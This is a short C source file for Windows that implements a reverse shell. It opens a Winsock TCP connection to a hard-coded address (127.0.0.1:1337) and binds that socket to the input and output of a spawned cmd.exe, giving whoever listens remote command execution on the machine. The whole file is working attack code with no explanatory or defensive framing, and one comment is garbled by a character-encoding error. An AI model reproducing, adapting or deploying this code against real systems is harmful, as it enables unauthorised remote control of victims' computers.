#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32")

#pragma warning(disable:4996) 



int main(int argc, char* argv[])
{

	WSADATA wsaData;
	SOCKET wSock;
	struct sockaddr_in hax;
	STARTUPINFO sui;
	PROCESS_INFORMATION pi;

	const char* ip = "127.0.0.1";
	short port = 1337;

	WSAStartup(MAKEWORD(2, 2), &wsaData);

	wSock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

	hax.sin_family = AF_INET;
	hax.sin_port = htons(port);
	hax.sin_addr.s_addr = inet_addr(ip);

	WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

	memset(&sui, 0, sizeof(sui));
	sui.cb = sizeof(sui);
	sui.dwFlags = STARTF_USESTDHANDLES;
	sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)wSock;

	// Æô¶¯ cmd.exe
	CreateProcessA(NULL, (LPSTR)"cmd.exe", (LPSECURITY_ATTRIBUTES)NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
	exit(0);
}